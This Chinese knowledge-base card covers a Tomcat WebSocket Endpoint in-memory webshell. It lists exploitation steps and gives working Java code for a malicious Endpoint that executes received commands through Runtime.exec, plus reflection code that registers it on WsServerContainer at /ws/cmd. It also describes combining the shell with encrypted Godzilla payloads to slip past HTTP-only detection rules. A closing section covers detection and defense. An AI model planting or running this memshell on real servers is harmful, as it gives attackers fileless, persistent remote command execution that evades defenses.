---
id: web-java-classloader-websocket-endpoint-memshell
title: Tomcat JSR-356 WebSocket Endpoint 内存马：反射注册 WsServerContainer 端点实现持久命令通道
type: scenario
domain: web
path: web/java/classloader
technique: websocket-endpoint-memshell
tags:
- java
- tomcat
- websocket
- memshell
- persistence
- jsr356
- endpoint
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:17:57+08:00'
  notes: 已对照原文与20张图核对；WsSci/WsServerContainer属性、WsFilter双条件、addEndpoint置endpointsRegistered、ServerEndpointConfig.Builder及whoami/ipconfig成功截图均一致。保留点：卡内最小PoC用InputStream.readAllBytes(Java9+)，原文JDK8环境需改BufferedReader；未复跑
url: /docs/web/java/classloader/web-java-classloader-websocket-endpoint-memshell/
draft: false
kb_aliases:
- WebSocket 内存马
- WS memshell
- Endpoint 内存马
- WsServerContainer 内存马
---

## 一句话结论

在能执行一次任意 Java 代码的前提下，反射取得 Tomcat 的 `WsServerContainer` 并 `addEndpoint` 注册一个恶意 WebSocket Endpoint，即可获得不落文件、随应用存活到重启的全双工命令通道。

## 原理

Tomcat 通过 JSR-356 的 `ServletContainerInitializer` 机制初始化 WebSocket：`WsSci.onStartup` 创建 `WsServerContainer`，并把它以属性名 `javax.websocket.server.ServerContainer`（Tomcat 10+ 为 `jakarta.websocket.server.ServerContainer`）放入 ServletContext 的 attributes。

`WsFilter.doFilter` 只有在两个条件同时成立时才升级协议：

1. `WsServerContainer.areEndpointsRegistered()` 为 true；
2. 请求是 `GET` 且带 `Upgrade: websocket`。

`areEndpointsRegistered` 默认为 false，只在调用 `addEndpoint(ServerEndpointConfig, boolean)` 后置为 true。攻击者只要拿到 `WsServerContainer` 引用并调用公开重载 `addEndpoint(ServerEndpointConfig)`，就能注册任意 `Endpoint` 子类；此后对注册路径发 WebSocket 握手即可建立长连接。`Endpoint.onMessage` 在容器线程中执行，命令结果可直接通过 `Session.getBasicRemote().sendText()` 回传，不经过 Servlet/Filter 的业务路由，也不在磁盘留下文件。

## 触发条件

- 中间件支持 JSR-356：Tomcat 7.0.47+、Jetty 9.4+ 等；
- 攻击者已具备一次任意代码执行能力（反序列化、表达式注入、上传 JSP、任意 Servlet 调用等），用于投放注册逻辑；
- 注册路径未被前置 WAF/网关阻断 WebSocket 升级；
- 应用不重启（重启会清空容器内存中的动态端点）。

## 利用步骤

1. 编写恶意 `Endpoint` 子类，实现 `onOpen` 注册消息处理器、`onMessage` 执行命令并回传；
2. 在注入点取到当前 `ServletContext`，反射进入 `ApplicationContext` 的 `attributes`，取出 `javax.websocket.server.ServerContainer`；
3. 用 `ServerEndpointConfig.Builder.create(恶意类, 路径).build()` 构造配置并调用 `addEndpoint`；
4. 删除/清理初始注入文件后，用 WebSocket 客户端连接注册路径，发送命令验证；
5. 清理需重启应用或反射调用 `removeEndpoint`，仅删除文件无效。

## PoC

恶意端点（最小命令回显）：

```java
import javax.websocket.*;
import java.io.*;

public class WsCmd extends Endpoint implements MessageHandler.Whole<String> {
    private Session s;

    @Override
    public void onOpen(Session s, EndpointConfig c) {
        this.s = s;
        s.addMessageHandler(this);
    }

    @Override
    public void onMessage(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            String out = new String(p.getInputStream().readAllBytes());
            s.getBasicRemote().sendText(out);
        } catch (Exception ignored) {
        }
    }
}
```

注册逻辑（放在可执行代码中，示例为 Servlet 内）：

```java
import javax.servlet.ServletContext;
import javax.websocket.server.ServerEndpointConfig;
import org.apache.tomcat.websocket.server.WsServerContainer;
import java.lang.reflect.Field;
import java.util.concurrent.ConcurrentHashMap;

ServletContext ctx = request.getServletContext();

Field f = ctx.getClass().getDeclaredField("context");   // ApplicationContextFacade -> ApplicationContext
f.setAccessible(true);
Object app = f.get(ctx);

f = app.getClass().getDeclaredField("attributes");
f.setAccessible(true);
ConcurrentHashMap<String, Object> attrs = (ConcurrentHashMap<String, Object>) f.get(app);

WsServerContainer ws = (WsServerContainer) attrs.get("javax.websocket.server.ServerContainer");
ws.addEndpoint(ServerEndpointConfig.Builder.create(WsCmd.class, "/ws/cmd").build());
```

随后用任意 WebSocket 客户端连接 `ws://target/ws/cmd`，发送 `whoami` 即可收到回显。

## 变体与关联

- 若目标允许直接 `ServletContext.getAttribute("javax.websocket.server.ServerContainer")`，可省去反射；
- Tomcat 10+ 属性名改为 `jakarta.websocket.server.ServerContainer`，注入类需使用 `jakarta.websocket.*` 包；
- 与哥斯拉二开结合：客户端按 WebSocket 帧发送 AES 加密的 Godzilla 载荷（文本帧 0x81 / 二进制帧 0x82），服务端 Endpoint 解密后 `defineClass` 加载大马，再用 `equals` 传参、`toString` 取结果的约定执行，流量不再是 HTTP 请求体，可绕过只检查 HTTP 的 webshell 规则；
- 关联：Filter/Servlet/Listener/Valve 内存马（同为动态注册组件）、JSP 内存 Servlet、Attach Agent 内存马。

## 检测与防御

- 检测：WebSocket 升级请求指向非业务路径（如 `/ws/cmd`、随机短路径）；同一 IP 长时间保持 WebSocket 并周期性发送命令；`Sec-WebSocket-Key` 异常固定或非随机；
- 内存排查：通过 Arthas/Java Agent 枚举 `WsServerContainer` 的 endpoint 映射，查找非应用声明的 `Endpoint` 子类；堆 dump 搜索 `Endpoint` 实现与命令执行相关字符串；
- 防御：限制可执行业务代码的入口（反序列化白名单、表达式沙箱）；网关对 WebSocket 升级路径做白名单；应用重启或热部署后复核端点列表；对 `WsServerContainer` 的反射调用做 RASP 监控。
